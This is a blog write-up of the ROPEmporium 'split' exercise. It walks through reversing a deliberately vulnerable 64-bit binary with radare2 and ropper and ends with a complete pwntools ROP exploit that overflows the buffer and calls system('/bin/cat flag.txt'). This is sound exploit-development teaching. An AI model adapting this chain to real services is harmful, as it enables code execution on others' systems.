<!DOCTYPE html>
<html>
<head>

    <!-- Document Settings -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <!-- Base Meta -->
    <!-- dynamically fixing the title for tag/author pages -->



    <title>ROPEmporium: 1-Split (64-bit)</title>
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Styles'n'Scripts -->
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
    <!-- highlight.js -->
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
    <style>.hljs { background: none; }</style>

    <!--[if IE]>
        <style>
            p, ol, ul{
                width: 100%;
            }
            blockquote{
                width: 100%;
            }
        </style>
    <![endif]-->
    
    <!-- This tag outputs SEO meta+structured data and other important settings -->
    <meta name="description" content="Security researching from the nordics" />
    <link rel="shortcut icon" href="/assets/images/static/blog-icon.png" type="image/png" />
    <link rel="canonical" href="/ropemporium-1-split" />
    <meta name="referrer" content="no-referrer-when-downgrade" />

     <!--title below is coming from _includes/dynamic_title-->
    <meta property="og:site_name" content="Securityits.io" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="ROPEmporium: 1-Split (64-bit)" />
    <meta property="og:description" content="Doing a ROPEmporium Series, time to switch it up with Split! Before you read any further go back and have a look on my previous ROPEmporium post, as this post will build on that knowledge. But also have some familiarity of GDB Radare2 Assembly This round we’ll use the same" />
    <meta property="og:url" content="/ropemporium-1-split" />
    <meta property="og:image" content="/assets/images/posts/2019/08/ropemporium-1-split/GTY_Hacker.jpg" />
    <meta property="article:publisher" content="https://www.facebook.com/false" />
    <meta property="article:author" content="https://www.facebook.com/false" />
    <meta property="article:published_time" content="2019-08-10T00:00:00+00:00" />
    <meta property="article:modified_time" content="2019-08-10T00:00:00+00:00" />
    <meta property="article:tag" content="Exploit-dev" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="ROPEmporium: 1-Split (64-bit)" />
    <meta name="twitter:description" content="Doing a ROPEmporium Series, time to switch it up with Split! Before you read any further go back and have a look on my previous ROPEmporium post, as this post will build on that knowledge. But also have some familiarity of GDB Radare2 Assembly This round we’ll use the same" />
    <meta name="twitter:url" content="/" />
    <meta name="twitter:image" content="/assets/images/posts/2019/08/ropemporium-1-split/GTY_Hacker.jpg" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Securityits.io" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="Exploit-dev" />
    <meta name="twitter:site" content="@Securitybits_io" />
    <meta name="twitter:creator" content="@Securitybits_io" />
    <meta property="og:image:width" content="1400" />
    <meta property="og:image:height" content="933" />

    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Website",
    "publisher": {
        "@type": "Organization",
        "name": "Securityits.io",
        "logo": "/assets/images/static/blog-icon.png"
    },
    "url": "/ropemporium-1-split",
    "image": {
        "@type": "ImageObject",
        "url": "/assets/images/posts/2019/08/ropemporium-1-split/GTY_Hacker.jpg",
        "width": 2000,
        "height": 666
    },
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "/ropemporium-1-split"
    },
    "description": "Doing a ROPEmporium Series, time to switch it up with Split! Before you read any further go back and have a look on my previous ROPEmporium post, as this post will build on that knowledge. But also have some familiarity of GDB Radare2 Assembly This round we’ll use the same"
}
    </script>

    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
    <script type="text/javascript">
    ghost.init({
    	clientId: "ghost-frontend",
    	clientSecret: "f84a07a72b17"
    });
    </script> -->

    <meta name="generator" content="Jekyll 3.6.2" />
    <link rel="alternate" type="application/rss+xml" title="ROPEmporium: 1-Split (64-bit)" href="/feed.xml" />


</head>
<body class="post-template">

    <div class="site-wrapper">
        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
        <!-- default -->

<!-- The tag above means: insert everything in this file
into the {body} of the default.hbs template -->

<header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
        
            
                <a class="site-nav-logo" href="/"><img src="/assets/images/static/blog-icon.png" alt="Securityits.io" /></a>
            
        
        
            <ul class="nav" role="menu">
    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
    <li class="nav-github" role="menuitem"><a href="https://github.com/securitybits-io">Github</a></li>
</ul>

        
    </div>
    <div class="site-nav-right">
        <div class="social-links">
            
            
                <a class="social-link social-link-tw" href="https://twitter.com/Securitybits_io" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
</a>
            
        </div>
        
    </div>
</nav>

    </div>
</header>

<!-- Everything inside the #post tags pulls data from the post -->
<!-- #post -->

<main id="site-main" class="site-main outer" role="main">
    <div class="inner">

        <article class="post-full  tag-exploit-dev post ">

            <header class="post-full-header">
                <section class="post-full-meta">
                    <time class="post-full-meta-date" datetime="10 August 2019">10 August 2019</time>
                    
                        <span class="date-divider">/</span>
                        
                            
                               <a href='/tag/exploit-dev/'>EXPLOIT-DEV</a>
                            
                        
                    
                </section>
                <h1 class="post-full-title">ROPEmporium: 1-Split (64-bit)</h1>
            </header>

            
            <figure class="post-full-image" style="background-image: url(/assets/images/posts/2019/08/ropemporium-1-split/GTY_Hacker.jpg)">
            </figure>
            

            <section class="post-full-content">
                <div class="kg-card-markdown">
                    <blockquote>
  <p>Doing a ROPEmporium Series, time to switch it up with Split!</p>
</blockquote>

<p>Before you read any further go back and have a look on my previous <a href="https://blog.securitybits.io/ropemporium-0-ret2win">ROPEmporium</a> post, as this post will build on that knowledge. But also have some familiarity of</p>

<ul>
  <li>GDB</li>
  <li>Radare2</li>
  <li>Assembly</li>
</ul>

<p>This round we’ll use the same tools as in 0-ret2win, with the addition to <a href="https://github.com/sashs/Ropper">Ropper</a> as we have to find and use specific gadgets to make the 64-bit exploit.</p>

<h2 id="description">Description</h2>

<blockquote>
  <p>I’ll let you in on a secret; that useful string “/bin/cat flag.txt” is still present in this binary, as is a call to system(). It’s just a case of finding them and chaining them together to make the magic happen.</p>
</blockquote>

<h2 id="setup">Setup</h2>

<p>Again lets download and do some initial analysis of the binary</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@linux:~/split# wget https://ropemporium.com/binary/split.zip
root@linux:~/split# unzip split.zip
root@linux:~/split# ls
flag.txt split split.zip
root@linux:~/split# file split
split: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8cbc19d1114b70bce2305f7ded9e7dd4d2e28069, not stripped
</code></pre></div></div>
<p>Awesome, still not stripped and we downloaded the proper 64-bit ELF Executable. We can also execute it to look on the program execution flow and what input data it wants.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Valkyrie:~/Documents/courses/ropemporium/1-split# ./split
split by ROP Emporium
64bits
Contriving a reason to ask user for data...
&gt; inputdata
Exiting
</code></pre></div></div>

<p>So the basic flow is similar to ret2win, no surprise there as this exercise is more looking at the assembly, but again the user is required to input data after the <em>”&gt; “</em>. Much like 0-Ret2Win the offset to our junk in order to control RIP is 40 bytes, and i am intentionally skipping the details in this step to focus more on the ROP Chain.</p>

<p>So again create the exploit template using pwntools</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Valkyrie:~/Documents/courses/ropemporium/1-split# \
&gt; pwn template --host 127.0.0.1 --port 31337 split --quiet &gt; exploit.py
</code></pre></div></div>

<p>And again keeping with the standard, adding the 40-byte junk and payload definition</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...snip...]
# -- Exploit goes here --
junk = 'A'*40

payload = ""
payload += junk

io = start()
io.recvuntil('&gt; ')
io.sendline(payload)
io.interactive()
</code></pre></div></div>

<p>So lets start reversing the binary and look for the gadgets that we have to use.</p>

<h2 id="radare2-reversing">Radare2 Reversing</h2>

<p>Analyzing the binary first with rabin2, to have a look on its protections we can see that the <code class="language-plaintext highlighter-rouge">nx: true</code> also that <code class="language-plaintext highlighter-rouge">stripped: false</code> . So again a ROP Chain is the key to success!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Valkyrie:~/Documents/courses/ropemporium/1-split# rabin2 -I split
arch x86
baddr 0x400000
binsz 7137
bintype elf
bits 64
canary false
class ELF64
compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
crypto false
endian little
havecode true
intrp /lib64/ld-linux-x86-64.so.2
laddr 0x0
lang c
linenum true
lsyms true
machine AMD x86-64 architecture
maxopsz 16
minopsz 1
nx true
os linux
pcalign 0
pic false
relocs true
relro partial
rpath NONE
sanitiz false
static false
stripped false
subsys linux
va true
</code></pre></div></div>
<p>So lets open the binary in Radare2 and look for our ROP Chain.</p>

<p><img src="assets/images/posts/2019/08/ropemporium-1-split/image-8.png" alt="Radare2 Reversing" /></p>

<p>So in the challenge description we got the hint that there are still a useful function, but also a useful string which have been split apart! Investigating both the <code class="language-plaintext highlighter-rouge">sym.usefulFunction</code> and <code class="language-plaintext highlighter-rouge">obj.usefulString</code> we can slowly see the parts that we have to use in order to print the <code class="language-plaintext highlighter-rouge">flag.txt</code>.</p>

<p><img src="assets/images/posts/2019/08/ropemporium-1-split/image-9.png" alt="Radare2 Symbols and useful functions" /></p>

<p>Above is the function in 1-split that contains the gadget system, but it’s also apparent that it wont print us the flag by simply calling the function. Since the edi will be filled with the pointer to the string <code class="language-plaintext highlighter-rouge">str.bin_ls</code> (/bin/ls) and will thus only print out the files in the current directory. While this proves code execution or command injection… doesn’t help us getting that flag! What we really want is to call the obj.usefulString as an argument to system</p>

<p><img src="assets/images/posts/2019/08/ropemporium-1-split/image-10.png" alt="Radare2 Strings" /></p>

<p>That will certainly print us the flag. But the next question is…. how can we change the calling string to system if it is hard coded into the binary?</p>

<h3 id="anatomy-of-a-rop-chain">Anatomy of a ROP Chain</h3>

<p>Now in order to dig a little into the calling convention of system calls in Linux we have to consult the ever exiting man page. Running <code class="language-plaintext highlighter-rouge">man system</code> in a terminal we are presented the manual for the library function <code class="language-plaintext highlighter-rouge">system()</code>.  </p>

<p><img src="assets/images/posts/2019/08/ropemporium-1-split/image-11.png" alt="manpage of system()" /></p>

<p>If we have a brief look into the description of the system call, we can identify that the calling convention is <code class="language-plaintext highlighter-rouge">system(&lt;string of what to be executed&gt;)</code> , so the first parameter is the command to run. Which follows the principle in <code class="language-plaintext highlighter-rouge">sym.usefulFunction</code> as the string before system is <code class="language-plaintext highlighter-rouge">/bin/ls</code>. Which in turn is placed in the <code class="language-plaintext highlighter-rouge">edi</code> register just before the call to <code class="language-plaintext highlighter-rouge">system()</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sym.usefulFunction ();
0x0040080b bfff084000 mov edi, str.bin_ls ;0x4008ff ; "/bin/ls" ; const char *string
0x00400810 e8cbfdffff call sym.imp.system ;int system(const char *string)
</code></pre></div></div>

<p>Now there’s a really good paper <a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf">x64-Cheatsheet.pdf</a> which explains a lot of the calls and methods in 64-bit assembly. A direct quote in the paper states that</p>

<blockquote>
  <p>4.3 Register Usage<br />
Additionally, %rdi, %rsi, %rdx, %rcx, %r8, and %r9 are used to pass the first six integer or pointer parameters to called functions. Additional parameters (or large parameters such as structs passed by value) are passed on the stack.</p>
</blockquote>

<p>Which means that it should look something like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-----------------------------------------------------------+
| Call      First   Second  Third   Fourth  Fifth   Sixth   |
| System()  %rdi    %rsi    %rdx    %rcx    %r8     %r9     |
+-----------------------------------------------------------+
</code></pre></div></div>

<p>Now we know that we need to move <code class="language-plaintext highlighter-rouge">obj.usefulString</code> into the first argument before calling <code class="language-plaintext highlighter-rouge">system()</code>, which should correlate to the <code class="language-plaintext highlighter-rouge">%RDI Register</code>, And there are three basic ways to achieve this and move data around in assembly:</p>

<ul>
  <li>push - push register onto top of stack</li>
  <li>pop - pop top of stack onto register</li>
  <li>mov - move source to destination</li>
</ul>

<p>But scrolling through the radare2 assembly can be a bit tedious, and there are a search function in radare2 to look for gadgets and specific calls, but its time to introduce ropper which will automagically find all the gadgets available to us in the binary or a glibc (though not necessary in the ROPEmporium challenges). So hunting for gadgets can be a bit tricky, as it usually requires to have a bunch of information and make assumptions as you go. luckily for us this time we only need one gadget this time, a <code class="language-plaintext highlighter-rouge">pop rdi</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Valkyrie:~/Documents/courses/ropemporium/1-split# ropper -f split
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
Gadgets
=======
[...snip...]
0x00000000004006b0: pop rbp; ret;
0x0000000000400883: pop rdi; ret;
0x0000000000400881: pop rsi; pop r15; ret;
[...snip...]
91 gadgets found
</code></pre></div></div>

<p>Ropper identified that on address <code class="language-plaintext highlighter-rouge">0x00400883</code> theres a <code class="language-plaintext highlighter-rouge">pop rdi; ret</code>, which is easily verified in radare2 with <code class="language-plaintext highlighter-rouge">pdi 2 @ 0x00400883</code></p>

<p><img src="assets/images/posts/2019/08/ropemporium-1-split/image-12.png" alt="pop rdi instruction" /></p>

<h3 id="constructing-the-rop-chain">Constructing the ROP Chain</h3>

<p>Now that we’ve identified the 3 parts we need in order to print the flag, its due time to start the assembly (No pun intended). This is something that we have to do in a specific order, which is more important in the later challenges but easier to understand now.</p>

<p>In order to call system with the string, we need to place the string into the RDI register before the system call. And since the <code class="language-plaintext highlighter-rouge">pop rdi</code> takes the <em>next stack address</em> and pops it into the register, the pop call needs to be right before the string address. so the chain have to look something like this</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[junk] + [pop rdi] + [usefulString] + [system]
</code></pre></div></div>

<p>Which is easily constructed in our exploit code, now that we have all the parts needed.</p>

<h2 id="split">Split</h2>

<p>This time we’ll go straight to pwntools, but you can substitute the names for binary addresses if you want. So the different parts we need just to reiterate are</p>

<ul>
  <li>Junk - which is <code class="language-plaintext highlighter-rouge">'A'*40</code> in order to control RIP and execute our own addresses</li>
  <li>usefulString - <code class="language-plaintext highlighter-rouge">exe.symbols.usefulString</code> the address to <code class="language-plaintext highlighter-rouge">/bin/cat flag.txt</code></li>
  <li>System() - <code class="language-plaintext highlighter-rouge">exe.symbols.system</code> to create the system call</li>
  <li>pop rdi - <code class="language-plaintext highlighter-rouge">0x00400883</code> to put the next stack address onto the proper register</li>
</ul>

<p>And in the final exploit we’ll use pwntools function p64(address) in order to convert a memory address into a packed string.</p>

<h3 id="final-exploit">Final Exploit</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Author: Christoffer.Claesson@Securitybits.io
#Blog: https://blog.securitybits.io/2019/08/10/ropemporium-1-split-64-bit/
</span>
<span class="c1">#!/usr/bin/env python2
# -*- coding: utf-8 -*-
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'split'</span><span class="p">)</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s">'127.0.0.1'</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">31337</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s">'''Execute the target binary locally'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s">'''Connect to the process on the remote host'''</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s">'''Start the exploit against the target.'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
break *0x{exe.symbols.main:x}
continue
'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="c1"># -- Exploit goes here --
</span><span class="n">junk</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">40</span> <span class="c1">#Controlling RIP Register
</span><span class="n">usefulString</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">usefulString</span><span class="p">)</span> <span class="c1">#/bin/cat flag.txt
</span><span class="n">system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">system</span><span class="p">)</span> <span class="c1">#Creating the system call
</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00400883</span><span class="p">)</span> <span class="c1">#Putting the string onto RDI
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">junk</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">usefulString</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">system</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Flag: '</span> <span class="o">+</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">))</span>
</code></pre></div></div>

<p><img src="assets/images/posts/2019/08/ropemporium-1-split/image-13.png" alt="Flag" /></p>

<p>GitHub: <a href="https://github.com/Securitybits-io/ROPEmporium">https://github.com/Securitybits-io/ROPEmporium</a></p>

                </div>
            </section>

            <!-- Email subscribe form at the bottom of the page -->
            

            <footer class="post-full-footer">
                <!-- Everything inside the #author tags pulls data from the author -->
                <!-- #author-->
                
                    
                        <section class="author-card">
                            
                                <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="christoffer" />
                            
                            <section class="author-card-content">
                                <h4 class="author-card-name"><a href="/author/christoffer">Christoffer Claesson</a></h4>
                                
                                    <p>I am Christoffer Claesson, a professional security researcher from Sweden who spends his days (and many nights) on red teaming, security deep dives, and homelab experiments. This blog is my way of giving back to the community by sharing lessons, notes, and the occasional side project that grew bigger than planned.</p>
                                
                            </section>
                        </section>
                        <div class="post-full-footer-right">
                            <a class="author-card-button" href="/author/christoffer">Read More</a>
                        </div>
                    
                
                <!-- /author  -->
            </footer>

            <!-- If you use Disqus comments, just uncomment this block.
            The only thing you need to change is "test-apkdzgmqhj" - which
            should be replaced with your own Disqus site-id. -->
            

        </article>

    </div>
</main>

<!-- Links to Previous/Next posts -->
<aside class="read-next outer">
    <div class="inner">
        <div class="read-next-feed">
            
                
                
                
                
                    <article class="read-next-card"
                        
                            style="background-image: url(/assets/images/static/blog-cover.jpg)"
                        
                    >
                        <header class="read-next-card-header">
                            <small class="read-next-card-header-sitetitle">&mdash; Securityits.io &mdash;</small>
                            
                                <h3 class="read-next-card-header-title"><a href="/tag/exploit-dev/">Exploit-dev</a></h3>
                            
                        </header>
                        <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
</div>
                        <div class="read-next-card-content">
                            <ul>
                                
                                
                                  
                                
                                  
                                
                                  
                                
                                  
                                
                                  
                                
                                  
                                
                                  
                                
                                  
                                    
                                        
                                        
                                            <li><a href="/ropemporium-3-write4">ROPEmporium: 3-Write4 (64-bit)</a></li>
                                        
                                    
                                  
                                
                                  
                                    
                                        
                                        
                                            <li><a href="/ropemporium-2-callme">ROPEmporium: 2-Callme (64-bit)</a></li>
                                        
                                    
                                  
                                
                                  
                                    
                                  
                                
                                  
                                    
                                        
                                        
                                            <li><a href="/ropemporium-0-ret2win">ROPEmporium: 0-Ret2Win (64-bit)</a></li>
                                        
                                    
                                  
                                
                                  
                                
                                  
                                
                                  
                                
                                  
                                
                                  
                                
                                  
                                
                                  
                                
                            </ul>
                        </div>
                        <footer class="read-next-card-footer">
                            <a href="/tag/exploit-dev/">
                                
                                    See all 3 posts  →
                                
                            </a>
                        </footer>
                    </article>
                
            

            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
            
                

    <article class="post-card post-template">
        
            <a class="post-card-image-link" href="/ropemporium-2-callme">
                <div class="post-card-image" style="background-image: url(/assets/images/posts/2019/08/ropemporium-2-callme/pexels-photo.jpg)"></div>
            </a>
        
        <div class="post-card-content">
            <a class="post-card-content-link" href="/ropemporium-2-callme">
                <header class="post-card-header">
                    
                        
                            
                                <span class="post-card-tags">Exploit-dev</span>
                            
                        
                    

                    <h2 class="post-card-title">ROPEmporium: 2-Callme (64-bit)</h2>
                </header>
                <section class="post-card-excerpt">
                    
                        <p>
  Continuing the ROP Series with Callme, this time going through Calling conventions


</p>
                    
                </section>
            </a>
            <footer class="post-card-meta">
                
                    
                        
                        <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="Christoffer Claesson" />
                        
                        <span class="post-card-author">
                            <a href="/author/christoffer/">Christoffer Claesson</a>
                        </span>
                    
                
                <span class="reading-time">
                    
                    
                      3 min read
                    
                </span>
            </footer>
        </div>
    </article>

            

            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
            
                

    <article class="post-card post-template">
        
            <a class="post-card-image-link" href="/ropemporium-0-ret2win">
                <div class="post-card-image" style="background-image: url(/assets/images/posts/2019/08/ropemporium-0-ret2win/exploit-development-1280x600.jpg)"></div>
            </a>
        
        <div class="post-card-content">
            <a class="post-card-content-link" href="/ropemporium-0-ret2win">
                <header class="post-card-header">
                    
                        
                            
                                <span class="post-card-tags">Exploit-dev</span>
                            
                        
                    

                    <h2 class="post-card-title">ROPEmporium: 0-Ret2Win (64-bit)</h2>
                </header>
                <section class="post-card-excerpt">
                    
                        <p>
  Doing a series on ROP and ROPEmporium, starting out with a simple ret2win


</p>
                    
                </section>
            </a>
            <footer class="post-card-meta">
                
                    
                        
                        <img class="author-profile-image" src="/assets/images/pages/profile/christoffer/profile.jpg" alt="Christoffer Claesson" />
                        
                        <span class="post-card-author">
                            <a href="/author/christoffer/">Christoffer Claesson</a>
                        </span>
                    
                
                <span class="reading-time">
                    
                    
                      6 min read
                    
                </span>
            </footer>
        </div>
    </article>

            

        </div>
    </div>
</aside>

<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
<div class="floating-header">
    <div class="floating-header-logo">
        <a href="/">
            
                <img src="/assets/images/static/blog-icon.png" alt="Securityits.io icon" />
            
            <span>Securityits.io</span>
        </a>
    </div>
    <span class="floating-header-divider">&mdash;</span>
    <div class="floating-header-title">ROPEmporium: 1-Split (64-bit)</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=ROPEmporium%3A+1-Split+%2864-bit%29&amp;url=https://jekyllt.github.io/jasper2/ropemporium-1-split"
            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>

        </a>
        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://jekyllt.github.io/jasper2/ropemporium-1-split"
            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
